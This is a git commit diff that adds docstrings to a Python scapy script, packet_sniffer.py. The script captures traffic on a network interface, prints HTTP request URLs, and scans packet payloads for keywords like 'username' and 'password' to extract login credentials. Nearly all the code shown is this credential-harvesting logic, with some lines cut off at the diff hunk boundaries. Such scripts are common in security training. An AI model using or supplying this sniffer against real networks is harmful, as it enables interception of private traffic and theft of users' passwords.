a5f7c460243087491a637c3c11b3372b3ec74291
Cory <CoryOConnor1994@gmail.com>
2025-03-12 18:04:25 +0000

    Update packet_sniffer.py
    Added Docstrings

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -3,14 +3,31 @@ from scapy.layers import http
 
 
 def sniff(interface):
+    """
+       Captures packets on the specified network interface.
+
+       :param interface: Network interface to sniff on (e.g., 'eth0').
+    """
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
 def get_url(packet):
+    """
+       Extracts the URL from an HTTP request packet.
+
+       :param packet: The sniffed packet containing an HTTP request.
+       :return: Full URL string of the request.
+    """
     return packet[http.HTTPRequest].Host.decode('utf-8') + packet[http.HTTPRequest].Path.decode('utf-8')
 
 
 def get_login_info(packet):
+    """
+        Extracts possible login credentials from a packet payload.
+
+        :param packet: The sniffed packet potentially containing login credentials.
+        :return: The extracted login information if found, otherwise None.
+    """
     if packet.haslayer(scapy.Raw):
         load = packet[scapy.Raw].load.decode('utf-8')
         keywords = ['username', 'uname', 'user', 'login', 'password', 'pass']
@@ -20,6 +37,11 @@ def get_login_info(packet):
 
 
 def process_sniffed_packet(packet):
+    """
+    Processes sniffed packets to extract and print HTTP requests and potential credentials.
+
+    :param packet: The sniffed packet.
+    """
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
         print(f'[+] HTTP Request >> {url}')
@@ -29,6 +51,7 @@ def process_sniffed_packet(packet):
 
 
 def main():
+    """Starts sniffing on given interface"""
     sniff('eth0')
 
 
